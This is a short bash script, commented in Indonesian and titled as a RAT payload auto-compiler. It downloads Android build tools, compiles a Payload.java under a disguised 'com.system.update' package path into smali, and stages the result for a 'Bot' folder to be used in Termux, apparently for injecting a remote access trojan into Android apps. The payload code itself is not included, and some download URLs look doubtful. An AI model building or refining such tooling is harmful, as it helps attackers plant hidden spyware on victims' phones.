#!/bin/bash

echo "======================================"
echo "   RAT PAYLOAD AUTO-COMPILER (JAVA->SMALI) "
echo "======================================"

# 1. Cek Wget (buat download)
if ! command -v wget &> /dev/null; then
    echo "[!] Wget tidak ditemukan, menginstall..."
    sudo apt install wget -y
fi

# 2. Cek Java (buat compile)
if ! command -v javac &> /dev/null; then
    echo "❌ GAGAL: Java (JDK) tidak ditemukan."
    echo "Jalankan: sudo apt install default-jdk -y"
    exit 1
fi

# 3. Bikin folder kerja
mkdir -p payload_src/com/system/update
mkdir -p payload_smali
cd payload_src/com/system/update

# 4. Download Alat (Kalau belum ada)
if [ ! -f d8.jar ]; then
    echo "[~] Mendownload D8 Compiler..."
    wget -q https://github.com/google/android-classyshark/releases/download/8.2.0/d8.jar
fi

if [ ! -f baksmali.jar ]; then
    echo "[~] Mendownload Baksmali..."
    wget -q https://github.com/baksmali/smali/releases/download/v2.5.2/baksmali-2.5.2.jar -O baksmali.jar
fi

# 5. Compile Java ke .class
echo "[~] Mengcompile Payload.java..."
javac Payload.java
if [ $? -ne 0 ]; then
    echo "❌ GAGAL: Error saat javac (Pastikan Payload.java ada di folder ini)."
    exit 1
fi

# 6. Ubah .class ke .dex
echo "[~] Mengubah ke format Android (.dex)..."
java -cp d8.jar com.android.tools.r8.D8 Payload.class --output .
if [ $? -ne 0 ]; then
    echo "❌ GAGAL: Error saat mengubah ke DEX."
    exit 1
fi

# 7. Ubah .dex ke .smali
echo "[~] Mengubah ke Smali..."
java -jar baksmali.jar d classes.dex -o smali_out
if [ $? -ne 0 ]; then
    echo "❌ GAGAL: Error saat mengubah ke Smali."
    exit 1
fi

# 8. Pindahin hasilnya
echo "[~] Memindahkan file Smali ke folder Bot..."
cp -r smali_out/com ../../../../payload_smali/

echo "======================================"
echo " ✅ COMPILE SUKSES! "
echo " Folder 'payload_smali' siap dipindah ke Termux."
echo "======================================"
